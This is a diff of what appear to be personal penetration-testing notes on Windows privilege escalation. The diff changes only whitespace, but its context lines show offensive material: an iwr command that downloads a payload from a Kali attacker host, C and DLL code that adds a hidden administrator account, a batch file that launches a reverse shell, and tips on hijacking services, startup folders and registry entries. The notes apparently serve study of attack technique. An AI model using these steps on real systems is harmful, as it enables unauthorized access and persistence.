@@ -101,6 +101,7 @@ layout: blank
 	- `x86_64-w64-mingw32-gcc newuser.c -o newuser.exe`
 		- `python3 -m http.server`
 		- `iwr -uri http://{kali_IP}:8000/newuser.exe -Outfile newuser.exe`
+		
 ```
 #include <stdlib.h>
 int main ()
@@ -133,6 +134,7 @@ int main ()
 	- `int i; i = system("net user /ADD tempuser"); i = system("net localgroups administrators /ADD tempuser"); break;`
 	- MinGW can compile C++ code into DLLs with the `--shared` flag
 		- `x86_64-w64-mingw32-gcc dll.cpp --shared -o dll.dll`
+
 ```
 #include <stdlib.h>
 #include <windows.h>
@@ -163,6 +165,7 @@ LPVOID lpReserved ) // Reserved
 
 **.bat files**
 - Just call an executable inside the batch file
+
 ```
 C:\Users\Public\reverseshell.exe
 ```
@@ -189,6 +192,7 @@ C:\Users\Public\reverseshell.exe
 		- Sometimes, privileged authors can put the executables in modifiable locations
 		- Thus, if we replace it, it will be run as a privileged user on next run time
 - Get startup tasks: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
+
 **Registry**
 - WinPEAS will output controllable Registry entries, look for
 	- `HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl])`
